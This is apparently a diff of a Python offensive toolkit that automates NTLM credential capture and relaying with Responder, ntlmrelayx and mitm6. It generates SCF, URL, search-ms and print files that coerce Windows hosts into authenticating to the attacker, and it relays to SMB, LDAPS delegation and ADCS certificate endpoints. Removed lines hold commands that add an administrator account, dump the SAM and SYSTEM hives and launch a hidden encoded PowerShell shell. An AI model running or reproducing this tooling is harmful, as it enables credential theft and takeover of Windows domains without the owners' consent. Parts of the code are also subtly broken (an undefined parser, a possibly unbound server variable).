@@ -3,30 +3,22 @@
 import os
 import sys
 import time
-import json
-import base64
-import signal
-import random
-import string
 import logging
 import argparse
 import netifaces
-import http.server
 from pathlib import Path
 from threading import Thread
-from datetime import datetime
 from termcolor import colored
-from subprocess import Popen, PIPE, STDOUT
+from subprocess import Popen, PIPE
 
-# Configure logging
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 logger = logging.getLogger(__name__)
 
-class AttackConfig:
-    """Configuration settings for different attack types"""
+class CoerceTemplates:
+    """Templates for authentication coercion"""
     
-    def __init__(self):
-        self.WEBDAV_TEMPLATE = """<?xml version="1.0" encoding="UTF-8"?>
+    # WebDAV search connector template 
+    SEARCH_MS = """<?xml version="1.0" encoding="UTF-8"?>
 <searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">
 <description>Microsoft Outlook</description>
 <isSearchOnlyItem>false</isSearchOnlyItem>
@@ -36,147 +28,259 @@ class AttackConfig:
 <folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>
 </templateInfo>
 <simpleLocation>
-<url>https://{server}/{path}</url>
+<url>\\\\{server}\\share\\</url>
 </simpleLocation>
-</searchConnectorDescription>
-"""
+</searchConnectorDescription>"""
 
-        self.SCF_TEMPLATE = """[Shell]
+    # SCF file template
+    SCF = """[Shell]
 Command=2
 IconFile=\\\\{server}\\share\\icon.ico
 [Taskbar]
-Command=ToggleDesktop
-"""
+Command=ToggleDesktop"""
 
-        self.DEFAULT_COMMANDS = {
-            'add_user': 'net user /add icebreaker P@ssword123456; net localgroup administrators icebreaker /add',
-            'dump_sam': 'reg save HKLM\\SAM sam.save & reg save HKLM\\SYSTEM system.save',
-            'shell': 'powershell.exe -NoP -sta -NonI -W Hidden -Enc {}'
-        }
+    # URL shortcut template 
+    URL = """[InternetShortcut]
+URL=file://{server}/share/
+IconFile=\\\\{server}\\share\\icon.ico
+IconIndex=1"""
 
-class RelayToolkit:
+    # Print notification template
+    PRINT = """<?xml version="1.0" encoding="UTF-8"?>
+<descendantfonts>
+<print>
+<properties xmlns="http://schemas.microsoft.com/windows/2006/propertiesschema">
+<property name="System.ItemNameDisplay">\\\\{server}\\share\\file</property>
+</properties>
+</print>
+</descendantfonts>"""
+
+class CredentialToolkit:
     def __init__(self, args):
         self.args = args
-        self.config = AttackConfig()
-        self.iface = args.interface or self.get_iface()
+        self.iface = args.interface or self.get_default_interface()
         self.local_ip = self.get_local_ip(self.iface)
         self.processes = []
-        self.targets = []
+        self.templates = CoerceTemplates()
         
-    def get_iface(self):
+    def get_default_interface(self):
         """Get default network interface"""
-        try:
-            return netifaces.gateways()['default'][netifaces.AF_INET][1]
-        except:
-            ifaces = []
-            for iface in netifaces.interfaces():
-                ipv4s = netifaces.ifaddresses(iface).get(netifaces.AF_INET, [])
-                for entry in ipv4s:
-                    addr = entry.get('addr')
-                    if addr and not (iface.startswith('lo') or addr.startswith('127.')):
-                        ifaces.append(iface)
-            return ifaces[0]
+        return netifaces.gateways()['default'][netifaces.AF_INET][1]
 
     def get_local_ip(self, iface):
         """Get local IP address"""
         return netifaces.ifaddresses(iface)[netifaces.AF_INET][0]['addr']
 
-    def edit_responder_conf(self, protocols_off=None):
+    def setup_coercion_files(self):
+        """Generate authentication coercion files"""
+        web_dir = Path('web')
+        web_dir.mkdir(exist_ok=True)
+        
+        # Generate various coercion files
+        files = {
+            'search.search-ms': self.templates.SEARCH_MS,
+            'share.scf': self.templates.SCF,
+            'share.url': self.templates.URL,
+            'print.xml': self.templates.PRINT
+        }
+        
+        for filename, template in files.items():
+            content = template.format(server=self.local_ip)
+            (web_dir / filename).write_text(content)
+            
+        self.print_good(f"Generated coercion files in {web_dir}")
+
+    def find_relay_targets(self):
+        """Find potential relay targets (SMB signing disabled)"""
+        self.print_info("Finding relay targets...")
+        cmd = f"netexec smb {self.args.target_range} --gen-relay-list targets.txt"
+        proc = self.run_command(cmd)
+        proc.wait()
+        return Path('targets.txt').exists()
+
+    def edit_responder_conf(self):
         """Configure Responder settings"""
-        if not protocols_off:
-            protocols_off = ['HTTP', 'SMB']
-            
-        conf = Path('Responder/Responder.conf')
-        if not conf.exists():
+        conf_path = Path('/usr/share/responder/Responder.conf')
+        if not conf_path.exists():
             self.print_bad("Responder.conf not found")
-            sys.exit(1)
+            return False
             
-        content = conf.read_text()
-        for proto in protocols_off:
+        content = conf_path.read_text()
+        protocols = ['HTTP', 'SMB'] if self.args.relay else []
+        for proto in protocols:
             content = content.replace(f"{proto} = On", f"{proto} = Off")
         
-        conf.write_text(content)
-        self.print_good(f"Disabled protocols in Responder.conf: {', '.join(protocols_off)}")
-
-    def run_command(self, cmd, shell=False):
-        """Execute command and return process"""
-        logger.debug(f"Running command: {cmd}")
-        if shell:
-            proc = Popen(cmd, shell=True, stdout=PIPE, stderr=PIPE)
-        else:
-            proc = Popen(cmd.split(), stdout=PIPE, stderr=PIPE)
-        self.processes.append(proc)
-        return proc
+        conf_path.write_text(content)
+        if protocols:
+            self.print_good(f"Disabled protocols in Responder.conf: {', '.join(protocols)}")
+        return True
 
     def start_responder(self):
-        """Start Responder with appropriate options"""
-        cmd = f'responder -I {self.iface} -rdwv'
+        """Start Responder for hash capture"""
+        cmd = f'responder -I {self.iface} -wv'
         if self.args.analyze:
             cmd += ' -A'
+        if self.args.challenge:
+            cmd += f' --lm --disable-ess'
+        if self.args.dhcp:
+            cmd += ' -d'
         return self.run_command(cmd)
 
     def start_ntlmrelay(self):
-        """Configure and start ntlmrelayx"""
+        """Start ntlmrelayx with appropriate options"""
+        if not self.args.relay:
+            return None
+            
         options = [
-            '-tf', self.args.target_file,
-            '-smb2support',
-            '-socks',
-            '-debug'
+            '-tf', 'targets.txt',
+            '-smb2support'
         ]
 
-        if self.args.shadow_credentials:
-            options.append('--shadow-credentials')
+        if self.args.socks:
+            options.append('-socks')
         
-        if self.args.adcs:
-            options.extend(['-machine-account', 'ATTACK$', '-machine-password', 'AttackPass123'])
-            
-        if self.args.delegate_access:
-            options.append('--delegate-access')
-            
-        if self.args.command:
-            options.extend(['-c', self.args.command])
-        elif self.args.auto:
-            options.extend(['-c', self.config.DEFAULT_COMMANDS['add_user']])
+        if self.args.relay_type:
+            if self.args.relay_type == 'ldaps':
+                options.extend(['-t', f'ldaps://{self.args.dc_ip}', '--delegate-access'])
+            elif self.args.relay_type == 'smb':
+                options.extend(['--no-http-server', '--no-smb-server'])
+            elif self.args.relay_type == 'adcs':
+                options.extend(['-t', f'http://{self.args.dc_ip}/certsrv/certfnsh.asp'])
 
         cmd = f'ntlmrelayx.py {" ".join(options)}'
         return self.run_command(cmd)
 
     def start_mitm6(self):
-        """Start mitm6 for IPv6 DNS poisoning"""
-        if not self.args.domain:
-            self.print_bad("Domain required for mitm6")
+        """Start mitm6 for IPv6 poisoning"""
+        if not self.args.ipv6 or not self.args.domain:
             return None
             
-        cmd = f'mitm6 -d {self.args.domain} -i {self.iface} --ignore-nofwd'
+        cmd = f'mitm6 -d {self.args.domain} -i {self.iface}'
         return self.run_command(cmd)
 
-    def setup_webdav(self):
-        """Configure WebDAV attack"""
-        webdav_xml = self.config.WEBDAV_TEMPLATE.format(
-            server=self.local_ip,
-            path='webdav'
-        )
-        Path('web/webdav.xml').write_text(webdav_xml)
-
-    def generate_coerce_files(self):
-        """Generate files for coercion attacks"""
-        scf_file = self.config.SCF_TEMPLATE.format(server=self.local_ip)
-        Path('web/@local.scf').write_text(scf_file)
-
     def start_http_server(self):
-        """Start HTTP server for payloads"""
-        if not self.args.no_http:
-            from http.server import HTTPServer, SimpleHTTPRequestHandler
-            httpd = HTTPServer(("", self.args.port), SimpleHTTPRequestHandler)
-            server_thread = Thread(target=httpd.serve_forever)
-            server_thread.daemon = True
-            server_thread.start()
-            self.print_good(f"Started HTTP server on port {self.args.port}")
-            return httpd
-        return None
+        """Start HTTP server for coercion files"""
+        os.chdir('web')
+        from http.server import HTTPServer, SimpleHTTPRequestHandler
+        server = HTTPServer(("", self.args.port), SimpleHTTPRequestHandler)
+        server_thread = Thread(target=server.serve_forever)
+        server_thread.daemon = True
+        server_thread.start()
+        self.print_good(f"Started HTTP server on port {self.args.port}")
+        return server
+
+    def run_command(self, cmd):
+        """Execute command and return process"""
+        logger.debug(f"Running command: {cmd}")
+        proc = Popen(cmd.split(), stdout=PIPE, stderr=PIPE)
+        self.processes.append(proc)
+        return proc
+
+    def auto_attack(self):
+        """Run automated attack sequence"""
+        try:
+            self.print_info("Starting automated attack sequence...")
+            
+            # 1. Initial recon
+            self.print_info("Phase 1: Initial Reconnaissance")
+            
+            # Check for broadcast protocols
+            self.print_info("Checking for broadcast protocols (LLMNR/NBT-NS)...")
+            analyze_proc = self.run_command(f'responder -I {self.iface} -A')
+            time.sleep(10)  # Give it time to detect broadcasts
+            analyze_proc.terminate()
+            
+            # Find potential relay targets using netexec
+            self.print_info("Scanning for relay targets...")
+            nxc_proc = self.run_command(f'netexec smb {self.args.target_range} --gen-relay-list targets.txt')
+            nxc_proc.wait()
+            
+            if Path('targets.txt').exists():
+                self.print_good("Found potential relay targets")
+                targets_found = True
+            else:
+                self.print_bad("No relay targets found")
+                targets_found = False
+
+            # Check for ADCS web endpoints
+            if self.args.dc_ip:
+                self.print_info("Checking for ADCS...")
+                adcs_proc = self.run_command(f'netexec ldap {self.args.dc_ip} -M adcs')
+                adcs_proc.wait()
+            
+            # 2. Setup attack infrastructure
+            self.print_info("Phase 2: Setting Up Attack Infrastructure")
+            
+            # Configure Responder
+            if not self.edit_responder_conf():
+                return
+                
+            # Setup coercion files
+            self.setup_coercion_files()
+            http_server = self.start_http_server()
+            
+            # 3. Start core services
+            self.print_info("Phase 3: Starting Core Services")
+            
+            responder = self.start_responder()
+            
+            # 4. Start relay attacks if targets found
+            if targets_found:
+                self.print_info("Phase 4: Starting Relay Attacks")
+                
+                # SMB relay with SOCKS
+                ntlmrelay_smb = self.run_command(
+                    'ntlmrelayx.py -tf targets.txt -smb2support -socks -no-http-server -no-smb-server'
+                )
+                
+                if self.args.dc_ip:
+                    # LDAPS relay for delegation
+                    ntlmrelay_ldaps = self.run_command(
+                        f'ntlmrelayx.py -t ldaps://{self.args.dc_ip} --delegate-access'
+                    )
+                    
+                    # ADCS relay
+                    ntlmrelay_adcs = self.run_command(
+                        f'ntlmrelayx.py -t http://{self.args.dc_ip}/certsrv/certfnsh.asp'
+                    )
+            
+            # 5. Start IPv6 attack if domain specified
+            if self.args.domain:
+                self.print_info("Phase 5: Starting IPv6 Attack")
+                mitm6_proc = self.start_mitm6()
+                
+                if self.args.dc_ip:
+                    # Additional LDAPS relay specifically for mitm6
+                    ntlmrelay_mitm6 = self.run_command(
+                        f'ntlmrelayx.py -t ldaps://{self.args.dc_ip} --delegate-access --add-computer'
+                    )
+            
+            self.print_info("Attack infrastructure deployed - Monitoring for captures/relays")
+            self.print_info(f"Coercion files available at: http://{self.local_ip}:{self.args.port}/")
+            
+            # Print attack summary
+            self.print_info("\nActive Attack Channels:")
+            self.print_info("- NetBIOS/LLMNR Poisoning")
+            if targets_found:
+                self.print_info("- SMB Relay with SOCKS")
+                if self.args.dc_ip:
+                    self.print_info("- LDAPS Delegation Attack")
+                    self.print_info("- ADCS Certificate Attack")
+            if self.args.domain:
+                self.print_info("- IPv6 DNS Takeover")
+            
+            while True:
+                time.sleep(1)
+                
+        except KeyboardInterrupt:
+            self.print_info('\nStopping attack sequence...')
+        finally:
+            self.cleanup()
+            if http_server:
+                http_server.shutdown()
 
     def cleanup(self):
-        """Cleanup processes and temporary files"""
+        """Cleanup processes and files"""
         for proc in self.processes:
             try:
                 proc.terminate()
@@ -184,82 +288,46 @@ class RelayToolkit:
             except:
                 proc.kill()
 
+        # Cleanup temp files
         cleanup_files = [
-            'web/@local.scf',
-            'web/webdav.xml',
-            'targets.txt'
+            Path('web').glob('*'),
+            Path('targets.txt')
         ]
         
-        for f in cleanup_files:
-            try:
-                Path(f).unlink()
-            except:
-                pass
+        for pattern in cleanup_files:
+            for f in Path().glob(str(pattern)):
+                try:
+                    f.unlink()
+                except:
+                    pass
 
-    def print_bad(self, msg):
-        print(colored('[-] ', 'red') + msg)
-
-    def print_info(self, msg):
-        print(colored('[*] ', 'blue') + msg)
-
-    def print_good(self, msg):
-        print(colored('[+] ', 'green') + msg)
-
-    def auto_pwn(self):
-        """Automated attack sequence"""
-        # 1. Find relay targets
-        self.print_info("Finding relay targets...")
-        cmd = "netexec smb 10.10.10.0/24 --gen-relay-list targets.txt"
-        self.run_command(cmd).wait()
-
-        # 2. Set up attack infrastructure
-        self.edit_responder_conf()
-        self.setup_webdav()
-        self.generate_coerce_files()
-        httpd = self.start_http_server()
-
-        try:
-            # 3. Start core services
-            responder = self.start_responder()
-            ntlmrelay = self.start_ntlmrelay()
-            
-            # 4. Start additional attack vectors
-            if not self.args.no_mitm6:
-                mitm6 = self.start_mitm6()
-
-            self.print_info("Attack running - Press Ctrl+C to stop")
-            
-            # Monitor outputs
-            while True:
-                time.sleep(1)
-                
-        except KeyboardInterrupt:
-            self.print_info('\nStopping attack...')
-        finally:
-            self.cleanup()
-            if httpd:
-                httpd.shutdown()
+    def print_bad(self, msg): print(colored('[-] ', 'red') + msg)
+    def print_info(self, msg): print(colored('[*] ', 'blue') + msg)
+    def print_good(self, msg): print(colored('[+] ', 'green') + msg)
 
 def parse_args():
-    parser = argparse.ArgumentParser(description="Modern NTLM Relay Toolkit")
+    parser = argparse.ArgumentParser(description="Credential Collection and Relay Toolkit")
     parser.add_argument("-i", "--interface", help="Network interface to use")
-    parser.add_argument("-t", "--target-file", help="File containing relay targets")
-    parser.add_argument("-d", "--domain", help="Domain for mitm6 attack")
-    parser.add_argument("-c", "--command", help="Command to execute on successful relay")
     parser.add_argument("-p", "--port", type=int, default=8080, help="HTTP server port (default: 8080)")
     
-    # Attack vectors
-    parser.add_argument("--no-mitm6", action="store_true", help="Disable mitm6 DNS poisoning")
-    parser.add_argument("--no-http", action="store_true", help="Disable HTTP relay")
-    parser.add_argument("--no-smb", action="store_true", help="Disable SMB relay")
-    parser.add_argument("--adcs", action="store_true", help="Enable ADCS ESC8 attack")
-    parser.add_argument("--shadow-credentials", action="store_true", help="Enable shadow credentials attack")
-    parser.add_argument("--webdav", action="store_true", help="Enable WebDAV coercion")
-    parser.add_argument("--delegate-access", action="store_true", help="Configure delegation access")
+    # Attack targets
+    parser.add_argument("-dc", "--dc-ip", help="Domain controller IP")
+    parser.add_argument("-d", "--domain", help="Domain name for IPv6/WPAD attacks")
+    parser.add_argument("-tr", "--target-range", default="192.168.1.0/24", help="Target range for relay discovery")
     
-    # Modes
+    # Collection options
+    parser.add_argument("-a", "--analyze", action="store_true", help="Run in analyze mode")
+    parser.add_argument("-c", "--challenge", help="Custom NTLM challenge for downgrade attacks")
+    parser.add_argument("--dhcp", action="store_true", help="Enable DHCP poisoning")
+    
+    # Relay options
+    parser.add_argument("-r", "--relay", action="store_true", help="Enable NTLM relay")
+    parser.add_argument("-rt", "--relay-type", choices=['smb', 'ldaps', 'adcs'], help="Relay protocol type")
+    parser.add_argument("-s", "--socks", action="store_true", help="Enable SOCKS proxy")
+    
+    # Attack modes
     parser.add_argument("--auto", action="store_true", help="Enable automated attack sequence")
-    parser.add_argument("--analyze", action="store_true", help="Run Responder in analyze mode")
+    parser.add_argument("--ipv6", action="store_true", help="Enable IPv6 attacks")
     
     return parser.parse_args()
 
@@ -269,13 +337,12 @@ def main():
         sys.exit(1)
 
     args = parse_args()
-    toolkit = RelayToolkit(args)
+    toolkit = CredentialToolkit(args)
 
     if args.auto:
-        toolkit.auto_pwn()
+        toolkit.auto_attack()
     else:
-        toolkit.print_info("Starting manual mode...")
-        toolkit.auto_pwn()  # Use same flow but with manual options
+        parser.print_help()
 
 if __name__ == "__main__":
     main()
